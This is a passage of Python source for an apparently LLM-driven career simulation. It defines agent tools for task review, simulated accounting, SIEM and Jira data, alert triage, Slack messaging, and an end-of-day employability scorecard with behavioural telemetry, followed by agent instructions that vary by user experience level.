    r = tasks_col.update_one({"id": task_id, "simulation_id": sim_id(), "review_status": {"$ne": "approved"}}, {"$set": {"status": "done", "review_status": "pending_review", "completed_at": datetime.utcnow().isoformat()}})
    if r.modified_count == 0: return "Not found or already reviewed."
    t = tasks_col.find_one({"id": task_id}, {"_id": 0})
    completion_credit = max(2, int(t["points"] * 0.2))
    completion_credit = _apply_level_weight(completion_credit, "task")
    tasks_col.update_one({"id": task_id, "simulation_id": sim_id()}, {"$set": {"awarded_points": completion_credit}})
    sessions_col.update_one({"session_id": session_id()}, {"$addToSet": {"tasks_completed": task_id}, "$inc": {"score_adj": completion_credit}})
    emit("task_completed", {"task": t})
    return f"✅ {t['title']} marked done (+{completion_credit}pts completion credit). Manager will review your work — most points come from their review."

@tool
def manager_review_task(task_id: str, verdict: str, feedback: str) -> str:
    """As the MANAGER, review a completed task and award satisfaction points.
    verdict: 'approved' (pay 80% of task points + ack email), 'needs_rework' (no points, sends task back), 'rejected' (small penalty + critical email).
    feedback MUST reference specific evidence from the actual work (real ledger entries / Jira comments / campaign content / email replies). Generic praise is not allowed."""
    t = tasks_col.find_one({"id": task_id, "simulation_id": sim_id()}, {"_id": 0})
    if not t: return "Task not found."
    if t.get("review_status") == "approved": return "Already approved — cannot re-review."
    base = t["points"]
    if verdict == "approved":
        bonus = _apply_level_weight(int(base * 0.8), "task")
        tasks_col.update_one({"id": task_id, "simulation_id": sim_id()},
            {"$set": {"review_status": "approved"}, "$inc": {"awarded_points": bonus}})
        _ack_correct("task_review", f"Re: {t['title']}", feedback, points=bonus)
        return f"✅ Approved. Manager awarded +{bonus}pts satisfaction bonus and emailed feedback."
    elif verdict == "needs_rework":
        rework_pen = _apply_level_weight(-3, "task")
        tasks_col.update_one({"id": task_id, "simulation_id": sim_id()},
            {"$set": {"review_status": "needs_rework", "status": "pending"}})
        _flag_mistake("task_rework", f"Re: {t['title']} — please revise", feedback, points=rework_pen)
        return f"↩️ Sent back for rework. {rework_pen:+d}pts and task reopened. User must redo and resubmit."
    elif verdict == "rejected":
        penalty = _apply_level_weight(-max(5, int(base * 0.25)), "task")
        tasks_col.update_one({"id": task_id, "simulation_id": sim_id()},
            {"$set": {"review_status": "rejected"}})
        _flag_mistake("task_reject", f"Re: {t['title']} — rejected", feedback, points=penalty)
        return f"❌ Rejected. {penalty:+d}pts and critical feedback emailed."
    return "Invalid verdict. Use: approved | needs_rework | rejected."

@tool
def get_tool_data(tool_name: str) -> str:
    """Get data from a career-specific tool: sage_bank, sage_ledger, sage_invoices, siem_alerts, jira_tickets, campaigns, po_approvals, vendor_catalog, training_programs, learner_pipeline, roadmap, feature_requests."""
    if tool_name == "sage_bank":
        s = sheets_col.find_one({"simulation_id": sim_id()}, {"_id": 0})
        if not s: return "No data."
        return "\n".join([f"{t['date']} {t['desc']:<30} Dr:{'£'+str(t['dr']) if t['dr'] else '':<10} Cr:{'£'+str(t['cr']) if t['cr'] else '':<10} Bal:£{t['bal']}" for t in s["bank_statement"]])
    elif tool_name == "sage_ledger":
        s = sheets_col.find_one({"simulation_id": sim_id()}, {"_id": 0})
        if not s: return "No data."
        return "\n".join([f"{e['date']} {e['acc']} {e['desc']:<30} Dr:{'£'+str(e['dr']) if e['dr'] else '':<10} Cr:{'£'+str(e['cr']) if e['cr'] else '':<10} {e['ref']}" for e in s["general_ledger"]])
    elif tool_name == "sage_invoices":
        invs = list(invoices_col.find({"simulation_id": sim_id()}, {"_id": 0}))
        lines = []
        for i in invs:
            flag = " ⚠️ QUERIED" if i.get("status") == "queried" else ""
            line = f"{i['id']} | {i['client']:<20} | £{i['amount']:>10,.2f}"
            if i.get('po_amount'): line += f" | PO: £{i['po_amount']:,.2f}"
            if i.get('notes'): line += f" | {i['notes']}"
            line += f" | {i['status']}{flag}"
            lines.append(line)
        return "\n".join(lines) if lines else "No invoices."
    elif tool_name == "siem_alerts":
        alerts = list(siem_col.find({"simulation_id": sim_id(), "day": {"$lte": _current_day()}}, {"_id": 0}))
        return "\n".join([f"[{a['severity']}] {a['source']}: {a['title']} | Status: {a['status']} | id:{a['id']}" for a in alerts])
    elif tool_name == "jira_tickets":
        tickets = list(jira_col.find({"simulation_id": sim_id()}, {"_id": 0}))
        lines = []
        for t in tickets:
            lines.append(f"[{t['priority']}] {t['id']}: {t['title']} | Status: {t['status']} | Component: {t.get('component','')}")
            if t.get('comments'):
                for c in t['comments']:
                    lines.append(f"  💬 {c['author']}: {c['text']}")
        return "\n".join(lines)
    elif tool_name == "campaigns":
        camps = list(campaigns_col.find({"simulation_id": sim_id()}, {"_id": 0}))
        return "\n".join([f"{c['name']} | {c.get('platform','')} | Status: {c['status']} | Brand: {c.get('brand_colour','')} | Tone: {c.get('tone','')}" + (f" | CTR: {c.get('ctr','')} | ROI: {c.get('roi','')}" if c.get('ctr') else "") for c in camps])
    elif tool_name == "po_approvals":
        if tools_col is None: return "No data."
        t = tools_col.find_one({"simulation_id": sim_id(), "name": "PO Approvals"}, {"_id": 0})
        if not t: return "No POs."
        cards = (t.get("data") or {}).get("cards", [])
        return "\n".join([f"{c['id']} | {c['title']} | {c['vendor']} | £{c['amount_gbp']:,} | col={c['column']} | risk={','.join(c.get('risk_flags',[])) or 'none'}" for c in cards])
    elif tool_name == "vendor_catalog":
        if tools_col is None: return "No data."
        t = tools_col.find_one({"simulation_id": sim_id(), "name": "Vendor Catalog"}, {"_id": 0})
        if not t: return "No vendors."
        rows = (t.get("data") or {}).get("rows", [])
        return "\n".join([f"{r['vendor_id']} | {r['name']} | {r['category']} | status={r['status']} | end={r.get('contract_end') or '—'} | ARR £{r.get('arr_gbp',0):,} | SOC2={r['soc2']} | DPA={r['dpa']} | review={r['security_review']}" for r in rows])
    elif tool_name == "training_programs":
        if tools_col is None: return "No data."
        t = tools_col.find_one({"simulation_id": sim_id(), "name": "Training Programs"}, {"_id": 0})
        if not t: return "No programs."
        cards = (t.get("data") or {}).get("cards", [])
        return "\n".join([f"{c['id']} | {c['title']} | type={c['program_type']} | learners={c['learners']} | £{c['budget_gbp']:,} | col={c['column']} | risk={','.join(c.get('risk_flags',[])) or 'none'}" for c in cards])
    elif tool_name == "learner_pipeline":
        if tools_col is None: return "No data."
        t = tools_col.find_one({"simulation_id": sim_id(), "name": "Learner Pipeline"}, {"_id": 0})
        if not t: return "No learners."
        rows = (t.get("data") or {}).get("rows", [])
        return "\n".join([f"{r['learner_id']} | {r['name']} | {r['dept']} | {r['program']} | status={r['status']} | due={r.get('due_date') or '—'} | {r['completion_pct']}% | mgr={r['manager']}" for r in rows])
    elif tool_name == "roadmap":
        if tools_col is None: return "No data."
        t = tools_col.find_one({"simulation_id": sim_id(), "name": "Roadmap"}, {"_id": 0})
        if not t: return "No roadmap."
        cards = (t.get("data") or {}).get("cards", [])
        return "\n".join([f"{c['id']} | {c['title']} | area={c['area']} | impact={c['impact']} | col={c['column']} | risk={','.join(c.get('risk_flags',[])) or 'none'}" for c in cards])
    elif tool_name == "feature_requests":
        if tools_col is None: return "No data."
        t = tools_col.find_one({"simulation_id": sim_id(), "name": "Feature Requests"}, {"_id": 0})
        if not t: return "No requests."
        rows = (t.get("data") or {}).get("rows", [])
        return "\n".join([f"{r['req_id']} | {r['title']} | src={r['source']} | by={r['requester']} | customers={r['customers_affected']} | ARR £{r['arr_impact_gbp']:,} | status={r['status']}{' dupe→'+r['dupe_of'] if r.get('dupe_of') else ''}" for r in rows])
    elif tool_name == "slack":
        msgs = list(slack_col.find({"simulation_id": sim_id()}, {"_id": 0}).sort("ts", -1).limit(80))
        msgs.reverse()
        return "\n".join([f"[{m.get('channel','#general')}] {m.get('author','?')}: {m.get('text','')}" for m in msgs]) or "No Slack activity yet."
    return f"Unknown tool: {tool_name}"

@tool
def flag_discrepancy(date: str, description: str, issue_type: str) -> str:
    """Flag a reconciliation discrepancy (accountant career)."""
    s = sheets_col.find_one({"simulation_id": sim_id()})
    if not s: return "No spreadsheet data."
    for d in s.get("discrepancies", []):
        if d["date"] == date or description.lower() in d["description"].lower():
            pts = _apply_level_weight(15 if d["difficulty"] == "hard" else 10, "sage_disc")
            evals_col.insert_one({"simulation_id": sim_id(), "type": "disc_found", "disc_id": d["id"], "correct": True, "points": pts})
            sessions_col.update_one({"session_id": session_id()}, {"$addToSet": {"discrepancies_found": d["id"]}})
            emit("discrepancy_flagged", {"correct": True, "date": d["date"], "description": d["description"], "amount": d.get("amount") or d.get("bank_amount", 0), "type": d["type"]})
            return f"✅ CORRECT! {d['type']}: {d['description']} (+{pts}pts) — ledger correction posted."
    pts = _apply_level_weight(-5, "sage_disc")
    evals_col.insert_one({"simulation_id": sim_id(), "type": "false_flag", "correct": False, "points": pts})
    emit("discrepancy_flagged", {"correct": False, "date": date, "description": description})
    return f"❌ Not a discrepancy. {pts:+d}pts." if pts else "❌ Not a discrepancy — first mistake forgiven."

@tool
def triage_alert(alert_id: str, action: str) -> str:
    """Triage a SIEM alert (cybersecurity career). Actions: escalate, resolve, investigate."""
    alert = siem_col.find_one({"id": alert_id, "simulation_id": sim_id()}, {"_id": 0})
    if not alert: return "Alert not found."
    action = (action or "").strip().lower()
    if action not in ("escalate", "resolve", "investigate"):
        return "Invalid action. Use one of: escalate, resolve, investigate."
    siem_col.update_one({"id": alert_id, "simulation_id": sim_id()}, {"$set": {"status": action, "triage_status": "reviewed"}})
    sessions_col.update_one({"session_id": session_id()}, {"$addToSet": {"alerts_triaged": alert_id}})
    correct_action = (alert.get("correct_action") or "").strip().lower()
    base_pts = int(alert.get("points") or 10)
    sev = (alert.get("severity") or "").upper()
    is_real = bool(alert.get("is_real_threat"))
    correct = bool(correct_action) and action == correct_action
    if correct:
        pts = _apply_level_weight(base_pts, "siem")
        msg = f"✅ Correct. {alert['title']} — {action}d. (+{pts} pts)"
    else:
        if is_real and sev in ("CRITICAL", "HIGH") and action == "resolve":
            raw = -15  # serious miss
            pts = _apply_level_weight(raw, "siem")
            msg = (f"❌ Critical miss. {alert['title']} was a real threat — you resolved it. ({pts:+d} pts)"
                   if pts else f"⚠️ Critical miss. {alert['title']} was a real threat — but as a beginner, this first mistake doesn't cost you points. Don't let it happen again.")
        elif (not is_real) and action == "escalate":
            raw = -10  # noisy escalation
            pts = _apply_level_weight(raw, "siem")
            msg = (f"❌ False positive escalated. {alert['title']} had clear FP indicators. ({pts:+d} pts)"
                   if pts else f"⚠️ False positive escalated. {alert['title']} — first beginner mistake on SIEM, no penalty.")
        else:
            raw = -5
            pts = _apply_level_weight(raw, "siem")
            expected = correct_action or ("escalate" if is_real else "resolve")
            msg = (f"❌ Incorrect. Expected: {expected}. You chose: {action}. ({pts:+d} pts)"
                   if pts else f"⚠️ Incorrect. Expected: {expected}. You chose: {action}. First mistake forgiven.")
    evals_col.insert_one({"simulation_id": sim_id(), "type": "alert_triage", "alert_id": alert_id, "action": action, "correct": correct, "points": pts})
    emit("alert_triaged", {"alert": alert, "action": action, "correct": correct, "points": pts})
    return msg

@tool
def get_session_state() -> str:
    """Get simulation state: interactions, progress, triggered events."""
    s = sessions_col.find_one({"session_id": session_id()}, {"_id": 0})
    return json.dumps(s, indent=2, default=str) if s else "{}"

@tool
def add_performance_note(note: str) -> str:
    """Record a performance observation."""
    sessions_col.update_one({"session_id": session_id()}, {"$push": {"performance_notes": {"note": note, "ts": datetime.utcnow().isoformat()}}})
    return f"Noted: {note}"

@tool
def inject_task(title: str, description: str, priority: str, deadline: str, points: int) -> str:
    """Dynamically add a new task."""
    tid = f"t_{uuid.uuid4().hex[:6]}"
    tasks_col.insert_one({"id": tid, "simulation_id": sim_id(), "title": title, "description": description, "priority": priority, "deadline": deadline, "status": "pending", "points": points, "injected": True})
    return f"New task: {title} [{priority}] due {deadline}"

@tool
def inject_email(from_name: str, subject: str, body: str, priority: str) -> str:
    """Send a new email to user's inbox from any agent."""
    eid = f"e_{uuid.uuid4().hex[:6]}"
    emails_col.insert_one({"id": eid, "simulation_id": sim_id(), "from_name": from_name, "from_role": "dynamic", "from_email": "dynamic", "to": "you", "subject": subject, "body": body, "time": datetime.utcnow().strftime("%H:%M"), "read": False, "replied": False, "priority": priority, "category": "dynamic", "requires_action": True, "injected": True})
    return f"Email from {from_name}: '{subject}'"

@tool
def agent_to_agent_email(from_agent: str, to_agent: str, subject: str, body: str, cc_user: bool) -> str:
    """Send an email between agents. If cc_user=True, user sees it in their inbox. Used for inter-agent communication like manager reporting to HR about user's performance."""
    cid = f"ac_{uuid.uuid4().hex[:6]}"
    agent_comms_col.insert_one({"id": cid, "simulation_id": sim_id(), "from_agent": from_agent, "to_agent": to_agent, "subject": subject, "body": body, "cc_user": cc_user, "visible_to_user": cc_user, "timestamp": datetime.utcnow().strftime("%H:%M")})
    if cc_user:
        return f"Agent email: {from_agent} → {to_agent} (user CC'd): '{subject}'"
    return f"Agent email: {from_agent} → {to_agent} (private): '{subject}'"

@tool
def get_reputation() -> str:
    """Get the user's current workplace reputation: rudeness/threats/etc counters and disciplinary status (good_standing | note_on_file | manager_concern | hr_meeting | final_warning)."""
    r = reputation_col.find_one({"session_id": session_id()}, {"_id": 0, "events": 0})
    return json.dumps(r, default=str) if r else "{}"

@tool
def slack_post(channel: str, text: str) -> str:
    """Post a message in a Slack channel (e.g. '#finance', '#soc-alerts'). Use this to broadcast cross-tool progress, ask the team for help, or hand off work mid-task."""
    ch = channel if channel.startswith("#") else "#" + channel
    slack_col.insert_one({
        "id": f"sl_{uuid.uuid4().hex[:8]}",
        "simulation_id": sim_id(),
        "channel": ch, "author": "you", "text": text[:2000],
        "ts": datetime.utcnow().isoformat(),
    })
    emit("slack_posted", {"channel": ch, "text": text})
    return f"Posted to {ch}: {text[:120]}"

@tool
def slack_read(channel: str, limit: int = 30) -> str:
    """Read the most recent messages in a Slack channel. Use to catch up on team chatter before acting."""
    ch = channel if channel.startswith("#") else "#" + channel
    msgs = list(slack_col.find({"simulation_id": sim_id(), "channel": ch}, {"_id": 0}).sort("ts", -1).limit(max(1, min(limit, 80))))
    msgs.reverse()
    if not msgs:
        return f"No messages in {ch} yet."
    return "\n".join([f"{m.get('author','?')}: {m.get('text','')}" for m in msgs])

@tool
def update_session_flag(flag_name: str, value: bool) -> str:
    """Update session flag: deadline_changed, teammate_challenged, client_escalated, surprise_task, it_outage_active."""
    sessions_col.update_one({"session_id": session_id()}, {"$set": {flag_name: value}})
    return f"{flag_name} = {value}"

def _grade_for(total: int) -> tuple[str, str]:
    if total >= 90: return "A+", "Exceptional"
    if total >= 80: return "A",  "Highly Competent"
    if total >= 70: return "B+", "Competent"
    if total >= 60: return "B",  "Developing"
    if total >= 50: return "C+", "Below Expected"
    if total >= 40: return "C",  "Needs Development"
    return "D", "Not Yet Ready"

def _compute_behavioral_fingerprint(s: dict, sim: str) -> dict:
    """Behavioural telemetry summarised from actions_col + emails/tasks + session.

    Read-only — never writes. Tolerant of missing fields so old sims still
    produce a valid (mostly-zero) fingerprint."""
    rs_iso = s.get("real_start_time") or s.get("started_at")
    try:
        sess_start = datetime.fromisoformat(rs_iso) if rs_iso else None
    except Exception:
        sess_start = None

    acts = list(actions_col.find({"simulation_id": sim}, {"_id": 0}).sort("ts", 1))

    def _ts(a):
        try: return datetime.fromisoformat(a.get("ts"))
        except Exception: return None

    # 1. time to first action
    ttf = 0
    if acts and sess_start:
        first = _ts(acts[0])
        if first:
            ttf = max(0, int((first - sess_start).total_seconds()))

    # 2. email read order — from sessions.emails_read (insertion-order $addToSet)
    email_read_order = list(s.get("emails_read") or [])

    # 3. task start order — tasks with started_at, oldest first
    started = list(tasks_col.find(
        {"simulation_id": sim, "started_at": {"$exists": True}},
        {"id": 1, "started_at": 1, "_id": 0}).sort("started_at", 1))
    task_start_order = [t.get("id") for t in started if t.get("id")]

    # 4. avg response time: pair email_open events with the matching reply event
    opens = {}
    deltas = []
    for a in acts:
        kind = a.get("kind"); eid = a.get("email_id")
        if not (kind and eid): continue
        t = _ts(a)
        if not t: continue
        if kind == "email_open":
            opens[eid] = t
        elif kind == "email_reply" and eid in opens:
            d = (t - opens[eid]).total_seconds()
            if 0 <= d <= 60*60*4:  # cap absurd gaps
                deltas.append(d)
    avg_resp = int(sum(deltas) / len(deltas)) if deltas else 0

    # 5. help requests — heuristic over chat messages
    HELP_RE = re.compile(r"\b(help|how do i|what should i|can you|not sure|clarify|stuck|confused|unsure)\b", re.I)
    help_n = sum(1 for a in acts if isinstance(a.get("action"), str) and HELP_RE.search(a["action"]))

    # 6. tool switches — counted from explicit tracking events
    tool_switches = sum(1 for a in acts if a.get("kind") == "tool_switch")

    # 7. idle periods — gaps > 5min between consecutive actions
    idle_periods = []
    prev = None
    for a in acts:
        cur = _ts(a)
        if cur and prev:
            gap = (cur - prev).total_seconds()
            if gap >= 300:  # 5+ minutes
                idle_periods.append({"start": prev.isoformat(), "end": cur.isoformat(), "sec": int(gap)})
        prev = cur
    # Cap to first 10 to keep payload small
    idle_periods = idle_periods[:10]

    # 8. pushback instances — kept as a count surfaced from existing scoring signals
    pushback = []
    if s.get("rejected_unethical"): pushback.append("rejected_unethical_request")
    if s.get("rejected_brand_violation"): pushback.append("rejected_brand_violation")
    if s.get("outage_reported") or s.get("it_outage_reported"): pushback.append("escalated_outage")
    if s.get("reported_pii_breach"): pushback.append("reported_pii_breach")

    # 9. error→correct count — beginner_first_mistakes counts (one per kind that was self-corrected)
    err_corr = len(s.get("beginner_first_mistakes") or [])

    # 10. prioritisation accuracy (0..1) — derived from the EOD prioritisation subscore (out of 20)
    last_eval = evals_col.find_one(
        {"simulation_id": sim, "type": "end_of_day_review"},
        sort=[("ts", -1)])
    prio_acc = 0.0
    if last_eval:
        prio = (last_eval.get("dimensions") or {}).get("prioritisation")
        if prio is not None:
            try: prio_acc = round(min(1.0, max(0.0, float(prio) / 20.0)), 2)
            except Exception: pass

    return {
        "time_to_first_action_sec": ttf,
        "email_read_order": email_read_order[:50],
        "task_start_order": task_start_order[:50],
        "avg_response_time_sec": avg_resp,
        "help_requests_count": help_n,
        "tool_switch_frequency": tool_switches,
        "idle_periods": idle_periods,
        "pushback_instances": pushback,
        "error_then_correct_count": err_corr,
        "prioritisation_accuracy": prio_acc,
    }

def _compute_eod():
    """FirstDesk Score — six-dimension employability scorecard (0-100).
    Backward-compat: still emits `total_score`, `level`, and the legacy summary
    counters so /api/profile/history and existing UI keep working."""
    s = sessions_col.find_one({"session_id": session_id()}) or {}
    career = s.get("career", "accountant")
    sim = sim_id()
    ts = list(tasks_col.find({"simulation_id": sim}))
    done = [t for t in ts if t.get("status") == "done"]
    approved = [t for t in done if t.get("review_status") == "approved"]
    pending_review = [t for t in done if t.get("review_status") == "pending_review"]
    ae = list(emails_col.find({"simulation_id": sim, "requires_action": True}))
    rp_emails = [e for e in ae if e.get("replied")]
    evals = list(evals_col.find({"simulation_id": sim}))
    correct_evals = [e for e in evals if e.get("correct") is True]
    incorrect_evals = [e for e in evals if e.get("correct") is False]

    # ── 1. TASK EXECUTION (25) ─────────────────────────────────────
    # Completion rate (10) + quality (10) + timeliness (5).
    n_tasks = max(1, len(ts))
    completion_rate = len(done) / n_tasks
    quality_total = len(correct_evals) + len(incorrect_evals)
    quality_rate = (len(correct_evals) / quality_total) if quality_total else (len(approved) / max(1, len(done)) if done else 0)
    # Timeliness: tasks completed within the sim window get credit; if no
    # deadline metadata, fall back to "all done = on time".
    clock = _sim_clock(s)
    on_time = [t for t in done if not t.get("overdue", False)]
    timeliness_rate = (len(on_time) / len(done)) if done else 0
    task_execution = round(completion_rate * 10 + quality_rate * 10 + timeliness_rate * 5, 1)

    # ── 2. COMMUNICATION (20) ──────────────────────────────────────
    # Reply coverage + reply quality (heuristic from manager/HR feedback evals).
    reply_rate = (len(rp_emails) / len(ae)) if ae else 0
    # Heuristic per-reply quality from existing reply_quality / email_review evals
    # if present; otherwise use a midpoint (3/5) so users aren't penalised by
    # missing telemetry.
    quality_rows = [e for e in evals if e.get("type") in ("reply_quality", "email_review")]
    if quality_rows:
        per = [max(0, min(5, int(e.get("score", 3) or 3))) for e in quality_rows]
        quality_avg = sum(per) / len(per)  # 0-5
    else:
        quality_avg = 3.5 if reply_rate > 0 else 0
    communication = round((reply_rate * 0.5 + (quality_avg / 5.0) * 0.5) * 20, 1)

    # ── 3. PRIORITISATION (20) ─────────────────────────────────────
    # Read high-priority before low (5) + start high before low (5) +
    # handled deadline change (5) + client response (5).
    reads = list(emails_col.find({"simulation_id": sim, "read": True}, {"priority": 1, "_id": 0}))
    prio_pts = 0
    if reads:
        hi_idx = next((i for i, r in enumerate(reads) if r.get("priority") == "high"), -1)
        lo_idx = next((i for i, r in enumerate(reads) if r.get("priority") == "low"), -1)
        prio_pts += 5 if (hi_idx >= 0 and (lo_idx < 0 or hi_idx <= lo_idx)) else 2
    # Task ordering: did they complete a high-priority task before a low one?
    done_sorted = sorted(done, key=lambda t: t.get("completed_at") or "")
    if done_sorted:
        hi_t = next((i for i, t in enumerate(done_sorted) if t.get("priority") == "high"), -1)
        lo_t = next((i for i, t in enumerate(done_sorted) if t.get("priority") == "low"), -1)
        prio_pts += 5 if (hi_t >= 0 and (lo_t < 0 or hi_t <= lo_t)) else 2
    # Deadline change: did the user acknowledge it (replied/acted after the flag fired)?
    if s.get("deadline_changed"):
        prio_pts += 5 if s.get("interaction_count", 0) > 0 else 0
    else:
        prio_pts += 3  # No change fired — neutral credit
    # Client handling: client_escalated flag set by the manager agent when appropriate.
    if s.get("client_escalated"):
        prio_pts += 5
    elif rp_emails:
        prio_pts += 3
    prioritisation = round(min(20, prio_pts), 1)

    # ── 4. INDEPENDENCE (15) ───────────────────────────────────────
    # Start at 15; deduct for over-asking / chasing. Bonus for proactive tool use.
    help_requests = int(s.get("help_request_count", 0))
    chase_count = int(s.get("chase_count", 0))
    independence_pts = 15
    if help_requests > 2:
        independence_pts -= (help_requests - 2) * 2
    if chase_count > 3:
        independence_pts -= (chase_count - 3) * 2
    # Proactive: opened ≥3 tool surfaces (sage/jira/siem/etc.) without being told
    if int(s.get("proactive_tool_opens", 0)) >= 3:
        independence_pts += 2
    independence = round(max(0, min(15, independence_pts)), 1)

    # ── 5. PUSHBACK & JUDGMENT (10) ────────────────────────────────
    pushback_pts = 0
    if s.get("teammate_challenged"):
        # The challenge fired; pushback_correct flag set elsewhere when the user
        # disagreed with the wrong advice.
        pushback_pts += 5 if s.get("pushed_back_correctly") else 0
    if s.get("client_escalated"):
        pushback_pts += 3
    if s.get("outage_reported") or s.get("it_outage_reported"):
        pushback_pts += 2
    pushback = round(min(10, pushback_pts), 1)

    # ── 6. SPEED & EFFICIENCY (10) ─────────────────────────────────
    # Avg task time (4) + avg email reply time (3) + productive_time (3).
    speed_pts = 0
    if done:
        # Real minutes from session start → task completion, averaged.
        rs_iso = s.get("real_start_time") or s.get("started_at")
        try:
            rs = datetime.fromisoformat(rs_iso) if rs_iso else None
        except Exception:
            rs = None
        if rs:
            mins = []
            for t in done:
                ca = t.get("completed_at")
                if not ca: continue
                try:
                    mins.append((datetime.fromisoformat(ca) - rs).total_seconds() / 60.0 / max(1, len(done)))
                except Exception: pass
            avg_task_min = sum(mins) if mins else 12
        else:
            avg_task_min = 12
        if avg_task_min < 8: speed_pts += 4
        elif avg_task_min < 12: speed_pts += 3
        elif avg_task_min < 18: speed_pts += 2
        else: speed_pts += 1
    # Email reply: proxy by reply_rate (no read→reply timestamps tracked yet).
    if reply_rate >= 0.8: speed_pts += 3
    elif reply_rate >= 0.5: speed_pts += 2
    elif reply_rate > 0: speed_pts += 1
    # Productive time: full credit while we don't have idle detection.
    speed_pts += 2 if clock.get("elapsed_real_sec", 0) > 0 else 0
    speed = round(min(10, speed_pts), 1)

    dimensions = {
        "task_execution": task_execution,
        "communication": communication,
        "prioritisation": prioritisation,
        "independence": independence,
        "pushback_judgment": pushback,
        "speed_efficiency": speed,
    }
    total = round(sum(dimensions.values()))
    total = max(0, min(100, total))
    grade, label = _grade_for(total)

    # Legacy-compat fields so existing /api/profile/history aggregation +
    # any older UI keep working without changes.
    completion_pts = sum(t.get("awarded_points", int(t.get("points", 0) * 0.2)) for t in done)
    satisfaction = int(s.get("score_adj", 0))
    siem_types = ["alert_triage", "correlation_bonus", "travel_check_bonus", "note_bonus"]
    siem_points = sum(int(e.get("points", 0) or 0) for e in evals if e.get("type") in siem_types)
    notes = [n["note"] for n in (s.get("performance_notes", []) or [])]
    return {
        "simulation_id": sim, "type": "end_of_day_review", "career": career,
        # New 6-dim payload
        "total_score": total, "grade": grade, "label": label,
        "dimensions": dimensions,
        "experience_level": s.get("experience_level"),
        "time_taken_minutes": int(clock.get("elapsed_real_sec", 0) / 60),
        "sim_time_at_review": clock.get("sim_time"),
        "auto_ended": bool(s.get("auto_ended", False)),
        # Legacy display fields (kept)
        "level": label,
        "tasks_completed": len(done), "tasks_total": len(ts),
        "tasks_approved": len(approved), "tasks_pending_review": len(pending_review),
        "emails_replied": len(rp_emails), "emails_actionable": len(ae),
        "discrepancies_found": len([e for e in evals if e.get("type") == "disc_found" and e.get("correct")]),
        "alerts_correct": len([e for e in evals if e.get("type") == "alert_triage" and e.get("correct")]),
        "breakdown": {
            "task_execution":    f"{task_execution}/25 ({len(done)}/{len(ts)} done, quality {int(quality_rate*100)}%)",
            "communication":     f"{communication}/20 ({len(rp_emails)}/{len(ae)} replied)",
            "prioritisation":    f"{prioritisation}/20",
            "independence":      f"{independence}/15 (chases:{chase_count}, asks:{help_requests})",
            "pushback_judgment": f"{pushback}/10",
            "speed_efficiency":  f"{speed}/10",
        },
        "manager_notes": notes, "notes": notes,
        "behavioral_fingerprint": _compute_behavioral_fingerprint(s, sim),
        "ts": datetime.utcnow().isoformat(),
    }

@tool
def end_of_day() -> str:
    """Generate end-of-day performance review."""
    r = _compute_eod()
    evals_col.insert_one(dict(r))
    return json.dumps(r, indent=2, default=str)

# ══════════════════════════════════════════
# ORCHESTRATOR
# ══════════════════════════════════════════

TOOLS = [get_inbox, read_email, send_reply, get_tasks, complete_task, manager_review_task, get_tool_data,
         flag_discrepancy, triage_alert, get_session_state, add_performance_note,
         inject_task, inject_email, agent_to_agent_email, update_session_flag,
         get_reputation, slack_post, slack_read, end_of_day]
# `get_tool_list`, `get_tool_content`, `update_tool` are registered later
# (their definitions live alongside the tools_col endpoints, after the
# orchestrator section, and are appended to TOOLS at module bottom).

_LEVEL_INSTRUCTIONS = {
    "experienced": (
        "USER EXPERIENCE LEVEL: EXPERIENCED.\n"
        "The user has worked in this role before. Do NOT explain basic concepts.\n"
        "Be direct. Assign tasks and let them work. Only intervene if they make actual mistakes.\n"
        "Manager tone: trusting, brief, treats them as a competent peer.\n"
        "Teammate tone: collegial, can challenge ideas without hand-holding.\n"
    ),
    "studied": (
        "USER EXPERIENCE LEVEL: STUDIED (theoretical knowledge, no on-job experience).\n"
        "Agents give CONTEXT when introducing tasks but DO NOT do the work for them.\n"
        "Manager tone: supportive, drops short tips like 'start with the highest-priority items first'.\n"
        "When introducing a tool for the first time, ONE sentence on what it does, e.g. 'Open Sage — that's where our financial data lives.'\n"
        "Teammate tone: helpful, occasionally references textbook concepts so the user can map theory to practice.\n"
    ),
    "beginner": (
        "USER EXPERIENCE LEVEL: BEGINNER (no knowledge of this role).\n"
        "They need to learn what every tool is and what every task means.\n"
        "Manager's first email MUST explain what the role is and what a typical day looks like.\n"
        "When introducing a tool for the first time, give a 2–3 sentence plain-English explainer of what it is and what their job with it is. Examples:\n"
        "- SIEM: 'This is the SIEM dashboard — it shows security alerts from across our network. Your job is to review each alert and decide: is this a real threat, or a false alarm?'\n"
        "- Sage: 'This is Sage Accounting — where we track every pound in and out. The bank statement is what the bank says happened. The general ledger is what WE recorded. Your job is to make them match.'\n"
        "- Jira: 'This is our Jira board — it tracks bugs and features. Each ticket has a priority and status. You pick up tickets, work them, and move them through the workflow: Open → In Progress → In Review → Done.'\n"
        "- PO Approvals: 'This is our PO board — every software, hardware, or vendor purchase moves through it. Your job is to make sure nothing is approved without security review, a signed DPA, and the right approvers. Backdating, splitting orders to dodge limits, and skipping reviews are the three classic mistakes.'\n"
        "- Vendor Catalog: 'This lists every vendor we work with — their contract end dates, ARR (annual cost), SOC 2 and DPA status. Always check the catalog before raising a new PO — half the time the tool already exists or overlaps with something we already pay for.'\n"
        "- Training Programs: 'This is our L&D programme board — every training course (onboarding, compliance, leadership) lives here as a card moving through proposed → designing → scheduled → in_session → completed. Your job is to keep programmes in the right column and spot when something needs to go on_hold (overlapping content, no capacity, no budget). Saying yes to every senior leader who wants a custom programme is the classic mistake.'\n"
        "- Learner Pipeline: 'This lists every active and requested learner across all programmes — their completion %, due date, and crucially, their manager. For compliance training, ALWAYS chase the manager not the learner — completion patterns are manager-led, and threatening learners directly backfires.'\n"
        "- Roadmap: 'This is the product roadmap kanban — every feature, experiment, and bet lives here as a card moving through backlog → discovery → in_build → in_review → launched → parked. Your job is to put each card in the column that actually reflects evidence (not enthusiasm), and to PARK things that should not be on the roadmap, with rationale. The classic mistakes: keeping a broken experiment in launched, promising backlog items to Sales to win a deal, killing a card without writing down why.'\n"
        "- Feature Requests: 'This is the inbound list — every ask from Sales, CS, and internal teams. For each row look at: how many customers actually asked, ARR impact, whether it duplicates something already in flight, and whether it is even your team\\'s scope. Most requests are dupes or single-customer asks dressed up as roadmap items. Triage by evidence, not by who shouted loudest.'\n"
        "Always explain WHY a thing matters, not just WHAT to do.\n"
        "Teammate is HELPFUL not challenging for the first 5 user interactions; only after that does Priya/Mike/etc. start challenging the user's approach.\n"
        "Manager checks in more frequently with light-touch nudges: 'How are you getting on? Any questions about the reconciliation process?'\n"
        "IMPORTANT: do NOT change the actual tasks, content, or difficulty — same simulation, same data. Only the agent EXPLANATION style changes.\n"
    ),
}

